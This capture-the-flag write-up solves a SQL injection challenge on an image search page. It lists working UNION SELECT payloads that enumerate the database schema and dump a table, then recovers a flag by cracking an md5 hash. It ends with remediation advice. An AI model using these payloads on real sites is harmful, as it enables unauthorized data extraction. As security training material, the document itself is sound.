# Get the flag
Page: `/index.php?page=searchimg`

Same technique as *04_sql_injection_member*. Then only difference is that we can not produce an error message. But as we know since the 04 vulnerability, the web app use mysql so we can presume that what works on 04 will work here too :

1. Retrieve databases
`1 AND 1=0 UNION SELECT 1, DATABASE()`
=> *Member_images*

2. Retrieve tables
`1 AND 1=0 UNION SELECT 1, TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE table_schema=DATABASE()`
=> *list_images*

3. Retrieve columns 
`1 AND 1=0 UNION SELECT TABLE_NAME, COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE table_schema=DATABASE()`
=> *id, title, url, comment*

4. Getting all informations about a image
`1 AND 1=0 UNION SELECT id, concat(title, url, comment) FROM list_images`
=> *If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46*

So if we decrypt it with https://hashtoolkit.com/ we get : albatroz which is already in lower char, then we need to hash it with sha256.

# Security issue
Same as *04_sql_injection_member*, an attacker can retrieve DB informations.

# Fix it
1. Use parameterized statements to specify what you're going to receive (you can add regexp, typechecking etc...)
2. Use an ORM (they usually use parameterized statements)
3. Keep your database server up-to-date (as your ORM)